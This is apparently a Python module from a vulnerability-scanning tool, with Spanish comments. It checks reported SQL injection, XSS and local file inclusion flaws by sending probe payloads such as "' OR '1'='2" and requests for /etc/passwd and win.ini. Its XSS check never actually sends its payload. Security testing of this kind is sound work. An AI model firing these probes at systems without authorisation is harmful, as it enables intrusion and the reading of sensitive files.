# modules/vuln/exploiter.py
import asyncio
from typing import Dict, Optional
import logging
import aiohttp
from .scanner import Vulnerability

class Exploiter:
    """Explotación básica de vulnerabilidades"""
    
    def __init__(self):
        self.logger = logging.getLogger('Exploiter')
        
    async def verify_vulnerability(self, vuln: Vulnerability) -> Dict:
        """Verifica si una vulnerabilidad es explotable"""
        result = {
            'exploitable': False,
            'proof': None,
            'risk': 'Unknown'
        }
        
        try:
            # Verificar según tipo
            if vuln.id.startswith('SQLI'):
                result = await self._verify_sqli(vuln)
            elif vuln.id.startswith('XSS'):
                result = await self._verify_xss(vuln)
            elif vuln.id.startswith('LFI'):
                result = await self._verify_lfi(vuln)
                
            return result
            
        except Exception as e:
            self.logger.error(f"Verification error: {e}")
            return result
            
    async def _verify_sqli(self, vuln: Vulnerability) -> Dict:
        """Verifica SQL Injection"""
        result = {'exploitable': False, 'proof': None, 'risk': 'High'}
        
        try:
            # Verificación segura
            safe_payload = "' OR '1'='2"  # Payload que no debería retornar datos
            async with aiohttp.ClientSession() as session:
                async with session.get(vuln.evidence.split('\n')[0] + safe_payload) as response:
                    content = await response.text()
                    
                    # Verificar diferencias en respuesta
                    if 'error' in content.lower() or 'sql' in content.lower():
                        result['exploitable'] = True
                        result['proof'] = "SQL error message detected"
                        
            return result
            
        except Exception as e:
            self.logger.error(f"SQL verification error: {e}")
            return result
            
    async def _verify_xss(self, vuln: Vulnerability) -> Dict:
        """Verifica Cross-Site Scripting"""
        result = {'exploitable': False, 'proof': None, 'risk': 'Medium'}
        
        try:
            # Verificación segura
            safe_payload = "<script>console.log(1)</script>"
            async with aiohttp.ClientSession() as session:
                async with session.get(vuln.evidence.split('\n')[0]) as response:
                    content = await response.text()
                    
                    if safe_payload in content:
                        result['exploitable'] = True
                        result['proof'] = "XSS payload reflected in response"
                        
            return result
            
        except Exception as e:
            self.logger.error(f"XSS verification error: {e}")
            return result
            
    async def _verify_lfi(self, vuln: Vulnerability) -> Dict:
        """Verifica Local File Inclusion"""
        result = {'exploitable': False, 'proof': None, 'risk': 'High'}
        
        try:
            # Verificación segura
            test_files = ['/etc/passwd', 'c:\\windows\\win.ini']
            
            async with aiohttp.ClientSession() as session:
                for test_file in test_files:
                    url = vuln.evidence.split('\n')[0] + test_file
                    async with session.get(url) as response:
                        content = await response.text()
                        
                        if 'root:' in content or '[extensions]' in content:
                            result['exploitable'] = True
                            result['proof'] = f"File contents revealed: {test_file}"
                            break
                            
            return result
            
        except Exception as e:
            self.logger.error(f"LFI verification error: {e}")
            return result